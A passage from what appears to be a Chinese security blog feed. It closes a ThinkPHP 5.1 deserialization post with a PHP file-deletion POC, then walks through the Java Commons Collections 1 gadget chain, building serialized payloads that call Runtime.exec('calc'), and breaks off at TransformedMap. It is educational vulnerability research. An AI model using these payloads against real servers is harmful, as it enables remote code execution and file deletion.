<p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210709000912218.png" alt="image-20210709000912218"></p>
<p><strong>最后POC如下</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;<span class="comment">//一定要加，这是一个大坑</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [<span class="string">&quot;111.txt&quot;</span>];<span class="comment">//要删除的文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>

<h1 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h1><p>待更新。。</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
        <tag>Write-up</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之利用链分析集合(4)</title>
    <url>/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在搞清楚Java反射机制、RMI和基本的Java反序列化漏洞流程后，下一步便是分析Java反序列化漏洞的经典利用链了。但这对大部分人来说都并不容易，我在网上查阅了大量资料，大部分文章对于新手来说并不友好 - 刚开始我甚至搞不清楚测试反序列化漏洞的环境应该如何搭建，在这种情况下，又何谈分析代码。</p>
<p>这篇将集合所有经典的反序列化漏洞利用链的详细讲解（包括一些环境搭建），希望帮助更多人、也包括我自己，能够认识、理解利用链的深层原理。</p>
<blockquote>
<p>Do not become a script kiddie.</p>
</blockquote>
<p>代码同步项目：<a href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a></p>
<span id="more"></span>

<h1 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h1><p><a href="https://leihehehe.github.io/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">见此篇</a></p>
<h1 id="Apache-Commons-Collections-利用链"><a href="#Apache-Commons-Collections-利用链" class="headerlink" title="Apache Commons Collections 利用链"></a>Apache Commons Collections 利用链</h1><h2 id="什么是Commons-Collections"><a href="#什么是Commons-Collections" class="headerlink" title="什么是Commons Collections"></a>什么是Commons Collections</h2><p>有编程基础的同学应该知道，无论是<code>C Language, Java, Python</code>还是其他语言，都有**Library(库)**。在<code>Java</code>中，我们用<code>import</code>引入库，这样我们就可以使用被引入的库中的一些function了。而Apache Commons Collections就是一个第三方基础库。</p>
<blockquote>
<p>It provides several features to make collection handling easy. It provides many new interfaces, implementations and utilities.</p>
</blockquote>
<p>它提供了一些功能，可以更方便的管理Collection集合 - 因为方便，Commons Collections被广泛用于各种Java应用的开发。其中反序列化漏洞就出现在这个库中，这意味着使用<strong>该库的漏洞版本</strong>的Java应用会面临<strong>反序列化漏洞</strong>的威胁。而我们的目的，就是研究这个库是如何产生并被利用反序列化漏洞的。</p>
<h2 id="Commons-Collections-1"><a href="#Commons-Collections-1" class="headerlink" title="Commons Collections 1"></a>Commons Collections 1</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="下载准备"><a href="#下载准备" class="headerlink" title="下载准备"></a>下载准备</h4><ul>
<li><p>IntelliJ IDEA</p>
</li>
<li><p><a href="http://archive.apache.org/dist/commons/collections/binaries/">apache commons collection 3.1版本</a></p>
</li>
<li><p>JDK1.7(8u71前版本)</p>
</li>
</ul>
<h4 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h4><h5 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h5><p>首先创建一个<strong>Java</strong>项目，JDK记得选1.7版本的。</p>
<p>在<code>File-&gt;Project Structure-&gt;Modules-&gt;Dependencies</code>点右边的加号：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154615757.png" alt="image-20210731154615757"></p>
<p>导入我们下载好的cc jar包</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154659615.png" alt="image-20210731154659615"></p>
<p>配置就完成了。这时候我们可以看到<strong>library</strong>处已被引入。<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731160311855.png" alt="image-20210731160311855"></p>
<p>在Artifacts处也应该导入，具体步骤见<a href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之Ysoserial安装配置</a>中的<strong>WebServer环境搭建</strong>章节。</p>
<h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h5><p>也可以通过创建Maven项目，添加如下dependency:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="TransformedMap版本-POC构造过程"><a href="#TransformedMap版本-POC构造过程" class="headerlink" title="TransformedMap版本 - POC构造过程"></a>TransformedMap版本 - POC构造过程</h3><h4 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h4><p>安全研究的前辈们为我们发现并构造了利用这个漏洞的POC，我们现在就需要分析这条利用链的原理。</p>
<p>我们的利用链需要用到如下的Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>TransformedMap</li>
<li>AnotationInvocationHandler</li>
</ul>
<h4 id="第一步：InvokerTransformer"><a href="#第一步：InvokerTransformer" class="headerlink" title="第一步：InvokerTransformer"></a>第一步：InvokerTransformer</h4><p>在<code>InvokerTransformer</code>中，我们一眼可以看到如下的<strong>反射机制</strong>的使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//此处是关键</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//此处是关键</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//此处是关键</span></span><br><span class="line">            &#125; </span><br><span class="line">            ...<span class="comment">//此处省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在它的<code>transform()</code>方法中，将先get到了<code>input</code>所在的Class，然后，获取Class中的<code>method(this.iMethodName, this.iParamTypes)</code>，再<code>method.invoke(input, this.iArgs)</code>。那么我们是否可以控制这些变量来完成一个反射呢？</p>
<p><code>InvokerTransformer</code>有两个<strong>constructor</strong>，其中一个可以让我们传入以上需要用到的<code>iMethodName,iParamTypes,iArgs</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们就可以利用这个Class来触发RCE了！如果我们想要执行<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>的效果，应该怎么办呢？</p>
<p>把它和上面的<code>transform()</code>里的代码对照，我们将它写成反射的形式:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//input -&gt; Runtime.getRuntme() 这里的Cls-&gt; Runtime.class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="comment">//iMethodName -&gt; exec </span></span><br><span class="line"><span class="comment">//paramTypes -&gt; String.class</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//iArgs -&gt; &quot;calc&quot;</span></span><br></pre></td></tr></table></figure>

<p>一个简易的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//执行payload</span></span><br><span class="line">        invokerTransformer.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731192120814.png" alt="image-20210731192120814"></p>
<p>让我们来模拟一下客户端和服务器之间序列化和反序列化的过程：</p>
<p><strong>POC</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(invokerTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并执行payload</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//执行payload</span></span><br><span class="line">        inv.transform(input);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们运行一下，成功弹出了计算器！</p>
<p>但是，我们来分析一下，这样写出来的POC有什么限制：</p>
<blockquote>
<p>服务端的开发人员需要“帮助”我们做以下事情，才能触发漏洞：</p>
<ul>
<li>把反序列化后的Object强制转化为InvokerTransformer类型</li>
<li>构造Input - Runtime实例</li>
<li>执行InvokerTransformer中的transform方法，并将Runtime实例以方法参数传入。</li>
</ul>
</blockquote>
<p>可以说这样的POC基本无法用于现实中的Java应用里，毫无意义。</p>
<p>那么我们怎么改造呢？</p>
<h4 id="第二步：ChainedTransformer"><a href="#第二步：ChainedTransformer" class="headerlink" title="第二步：ChainedTransformer"></a>第二步：ChainedTransformer</h4><p>首先来解决<code>input</code>的问题，我们想要自己来写<code>input</code>，这样有更多的自主性。而<code>ChainedTransformer</code>类就满足我们的要求。正如其名，它有着把各个<code>transformer</code>串起来的功能。</p>
<p>在<code>ChainedTransformer</code>中，有这样一个method：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">           object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> object;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>它循环遍历了<code>iTransformers</code>中的每一个元素 - 每一次循环，它都会把<code>该元素.transform(object)</code>的结果（一个对象）赋值给<code>object</code>，并返回。</p>
<p>这意味着，下一个元素执行的<code>transform()</code>方法中的参数就是上一个元素执行<code>transform()</code>方法的返回值。</p>
<p>而在<code>ChainedTransformer</code>的构造函数中我们可以控制<code>iTransformers</code>变量（<code>Transformer[]</code>类型），因为<code>InvokerTransformer implements Transformer</code>，那么我们之前的<code>InvokerTransformer</code>也可放在<code>Transformer[]</code>中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以构想：让我们构造的<code>input</code>(Runtime实例)作为第一个遍历元素的返回值，再执行第二个元素的transform时，刚好就传入了input这个参数了。</p>
<p>但问题是，怎么让我们构造的<code>input</code>(Runtime实例)能被<code>Transformer</code>类或其子类的<code>transform()</code>方法中的返回呢？</p>
<h4 id="第三步：ConstantTransformer"><a href="#第三步：ConstantTransformer" class="headerlink" title="第三步：ConstantTransformer"></a>第三步：ConstantTransformer</h4><p>我们找到了<code>ConstantTransformer</code>类，它是实现<code>Transformer</code>类的，可以被放进<code>Transformer[]</code>数组。在类里，它有我们想要的<code>transform()</code>方法，且刚好就返回了<code>iConstant</code>，我们可以在构造函数中传入<code>Runtime.getRuntime()</code>这个Object。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;<span class="comment">//Constructor -》我们可以控制iconstant</span></span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//返回iconstant</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们的链就可以连起来了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//返回input(Runtime实例)，并将它作为下面的transform()的方法参数传入</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">&quot;Leihehe&quot;</span>);<span class="comment">//这里任何值都可以,因为ConstantTransformer.transform(object)中的object中没有被用到</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>原本想要的计算器没有出现，出现了错误：编译器提示<code>Runtime</code>没有实现<code>Serializable</code>，所以不能被序列化和反序列化。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731202443280.png" alt="image-20210731202443280"></p>
<p>那我们就采用反射的方法来获取Runtime实例，让服务器在反序列化的时候生成Runtime实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">&quot;Leihehe&quot;</span>);<span class="comment">//这里任何值都可以</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器！但这样漏洞可以触发的范围依然不大，仍需要开发者在服务端将object转换为<code>ChainedTransformer</code>类型，且执行<code>transform</code>方法，我们需要扩大漏洞触发范围。</p>
<h4 id="第四步：TransformedMap-put"><a href="#第四步：TransformedMap-put" class="headerlink" title="第四步：TransformedMap - put()"></a>第四步：TransformedMap - put()</h4><blockquote>
<p><code>Apache Commons Collections</code> 实现了一个 <code>TransformedMap</code> 类，该类是对 Java 标准数据结构 <code>Map</code> 接口的一个扩展 。</p>
</blockquote>
<p>在<code>TransformedMap</code>类中，我们可以发现以下methods</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.keyTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.keyTransformer.transform(object);</span><br><span class="line">       <span class="comment">//若keyTransformer不为null，则执行其transform方法</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.valueTransformer.transform(object);</span><br><span class="line">       <span class="comment">//若valueTransformer不为null，则执行其transform方法</span></span><br><span class="line">   &#125;    </span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这三个methods都会调用到对象的<code>transform</code>()方法，但都是<code>protected</code>属性，无法被外界访问，那么我们怎么触发到这三个方法呢？</p>
<p>继续在该Class中查看，发现了<code>put()</code>方法：</p>
